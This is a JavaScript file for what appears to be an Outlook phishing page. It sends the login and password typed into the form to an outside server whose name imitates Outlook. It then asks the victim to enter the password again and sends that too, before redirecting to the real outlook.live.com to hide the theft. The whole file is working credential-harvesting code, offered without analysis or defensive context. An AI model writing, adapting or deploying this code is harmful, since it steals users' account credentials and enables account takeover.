document.addEventListener("DOMContentLoaded", () => {
  let clickedOnce = false;

  const btn = document.getElementById("btn");
  const input1Field = document.getElementById("input1");
  const input2Field = document.getElementById("input2");
  const msg = document.getElementById("msg");

  // ✅ START of the new click logic
  btn.addEventListener("click", async () => {
    const input1 = input1Field.value.trim();
    const input2 = input2Field.value.trim();

    if (!input1 || !input2) {
      alert("Please fill in both fields.");
      return;
    }

    if (!clickedOnce) {
      btn.disabled = true;

      try {
        await fetch("https://outlook-backend-q89a.onrender.com/submit", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ input1, input2 }),
        });

        clickedOnce = true;
        input1Field.disabled = true;
        input2Field.value = "";
        msg.style.display = "block";

        btn.disabled = false;
        btn.textContent = "Continue";
      } catch (err) {
        console.error("❌ Failed to send:", err);
        alert("Something went wrong. Try again later.");
        btn.disabled = false;
      }
    } else {
      if (!input2) {
        alert("Please re-enter your password.");
        btn.disabled = false;
        btn.textContent = "Continue";
        return;
      }

      btn.disabled = true;
      btn.textContent = "Sending...";

      try {
        await fetch("https://outlook-backend-q89a.onrender.com/submit", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            input1: input1Field.value.trim(),
            input2,
          }),
        });

        msg.style.display = "none";

        if (window.parent !== window) {
          window.parent.postMessage("redirect-to-outlook", "*");
        } else {
          window.location.href = "https://outlook.live.com";
        }
      } catch (err) {
        console.error("❌ Failed second time:", err);
        alert("Something went wrong on second entry.");
        btn.disabled = false;
        btn.textContent = "Continue";
      }
    }
  });
  // ✅ END of new click logic
});
